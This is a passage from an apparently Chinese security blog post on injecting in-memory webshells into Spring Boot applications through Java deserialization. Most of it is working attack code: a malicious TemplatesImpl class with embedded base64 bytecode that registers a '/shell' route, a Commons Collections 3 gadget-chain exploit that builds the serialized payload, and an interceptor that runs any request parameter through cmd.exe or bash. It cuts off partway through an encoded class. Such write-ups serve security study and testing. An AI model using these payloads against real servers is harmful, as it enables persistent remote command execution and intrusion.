class="hljs-comment">//加载magicController类的字节码</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>            <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>            Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>            System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>            <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>            <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>            <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br><span class="hljs-comment">//        Method mm = (Class.forName(&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;).getDeclaredMethods())[0];</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>            rs.registerMapping(info, instance, mm);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>其实把前面的拿来复用一下就可以了，只不过这里再把流程完整记录一下</p><p>然后本地加了一个cc依赖，用cc3来打入内存马进行测试</p><p>cc3exp：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3Chain</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-comment">//利用反射设置需要满足的值</span><br>        Class c=templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        name.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;ControllerBehind.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-comment">//这里的赋值在序列化的时候就不需要了</span><br><span class="hljs-comment">//        Field tfactory = c.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="hljs-comment">//        tfactory.setAccessible(true);</span><br><span class="hljs-comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span><br><span class="hljs-comment">//        Transformer transformer = templates.newTransformer();</span><br>        <span class="hljs-comment">//结合前面的链子串联起来，随便一个都行</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        Map&lt;Object,Object&gt; map=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">annotation</span> <span class="hljs-operator">=</span> c1.getDeclaredConstructor(Class.class, Map.class);<br>        annotation.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotation.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> annotation.newInstance(Override.class, proxyMap);<br>        System.out.println(serialize(o));<br><span class="hljs-comment">//        unserialize(&quot;ser.bin&quot;);</span><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        ObjectOutputStream oos=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        <span class="hljs-keyword">return</span> Base64.getEncoder().encodeToString(bytes);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        ObjectInputStream ois=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        Object obj=ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>生成的base64字符串</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"><br></code></pre></td></tr></table></figure><p>然后传给漏洞路由，记得url编码一下</p><p><img src="https://cdn.clown2024.cn/image-20241114161649942.png" alt="image-20241114161649942"></p><p>然后现在就是成功打入了，返回error是链子反序列化的时候抛异常但是代码已经是执行了的</p><p>现在访问shell路由就可以执行任意命令了</p><p><img src="https://cdn.clown2024.cn/image-20241114161757835.png" alt="image-20241114161757835"></p><h2 id="反序列化利用interceptor"><a href="#反序列化利用Interceptor" class="headerlink" title="反序列化利用Interceptor"></a>反序列化利用Interceptor</h2><p>这里的利用也类似，那就走一遍流程</p><p>要注册的Interceptor</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>        <span class="hljs-keyword">if</span>(code != <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                java.io.<span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, code&#125;);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, code&#125;);<br>                &#125;<br>                p.redirectErrorStream(<span class="hljs-literal">true</span>);<br>                <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> p.start();<br>                <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                StringBuilder results=<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>                <span class="hljs-keyword">while</span>((result=r.readLine())!=<span class="hljs-literal">null</span>)&#123;<br>                    results.append(result+<span class="hljs-string">&quot;\r\n&quot;</span>);<br>                &#125;<br>                System.out.println(results);<br>                writer.println(results);<br>                writer.flush();<br>                writer.close();<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.postHandle(request, response, handler, modelAndView);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        HandlerInterceptor.<span class="hljs-built_in">super</span>.afterCompletion(request, response, handler, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>TemplatesImpl恶意类</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.clown;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InterceptorDes</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br>            <span class="hljs-type">AbstractHandlerMapping</span> <span class="hljs-variable">mappingHandlerMapping</span> <span class="hljs-operator">=</span> context.getBean(AbstractHandlerMapping.class);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                field = AbstractHandlerMapping.class.getDeclaredField(<span class="hljs-string">&quot;adaptedInterceptors&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            List&lt;HandlerInterceptor&gt; adaptInterceptors = <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                adaptInterceptors = (List&lt;HandlerInterceptor&gt;) field.get(mappingHandlerMapping);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQArAoAKABeCABFCwBfAGALAGEAYggAYwoAZABlCgALAGYIAGcKAAsAaAcAaQcAaggAawgAbAoACgBtCABuCABvCgAKAHAKAAoAcQcAcgcAcwoAdAB1CgAUAHYKABMAdwgAeAcAeQoAGQBeCgATAHoKABkAewgAfAoAGQB9CQBkAH4KAH8AgAoAgQCACgCBAIIKAIEAgwcAhAsAKQCFCwApAIYHAIcHAIgHAIkBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUxvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcjsBAAlwcmVIYW5kbGUBAGQoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlO0xqYXZhL2xhbmcvT2JqZWN0OylaAQABcAEAGkxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAGd3JpdGVyAQAVTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAFyAQAYTGphdmEvaW8vQnVmZmVyZWRSZWFkZXI7AQAGcmVzdWx0AQASTGphdmEvbGFuZy9TdHJpbmc7AQAHcmVzdWx0cwEAGUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHaGFuZGxlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABGNvZGUBAA1TdGFja01hcFRhYmxlBwBqBwCKBwBpBwCHBwCLBwCMBwCIBwCNBwByBwB5BwCEAQAKRXhjZXB0aW9ucwEAEE1ldGhvZFBhcmFtZXRlcnMBAApwb3N0SGFuZGxlAQCSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7KVYBAAxtb2RlbEFuZFZpZXcBAC5Mb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9Nb2RlbEFuZFZpZXc7AQAPYWZ0ZXJDb21wbGV0aW9uAQB5KExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL0V4Y2VwdGlvbjspVgEAAmV4AQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQAKU291cmNlRmlsZQEAFFRlc3RJbnRlcmNlcHRvci5qYXZhDAAqACsHAIsMAI4AjwcAjAwAkACRAQAHb3MubmFtZQcAkgwAkwCPDACUAJUBAAN3aW4MAJYAlwEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgEAEGphdmEvbGFuZy9TdHJpbmcBAAdjbWQuZXhlAQACL2MMACoAmAEACS9iaW4vYmFzaAEAAi1jDACZAJoMAJsAnAEAFmphdmEvaW8vQnVmZmVyZWRSZWFkZXIBABlqYXZhL2lvL0lucHV0U3RyZWFtUmVhZGVyBwCNDACdAJ4MACoAnwwAKgCgAQAAAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAKEAlQwAogCjAQACDQoMAKQAlQwApQCmBwCnDACoAKkHAIoMAKoAKwwAqwArAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAVABVDABYAFkBADtvcmcvY2xvd24vc3ByaW5nYm9vdG1lbW9yeXNoZWxsL2ludGVyY2VwdG9yL1Rlc3RJbnRlcmNlcHRvcgEAEGphdmEvbGFuZy9PYmplY3QBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABFqYXZhL2xhbmcvUHJvY2VzcwEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQATcmVkaXJlY3RFcnJvclN0cmVhbQEAHShaKUxqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50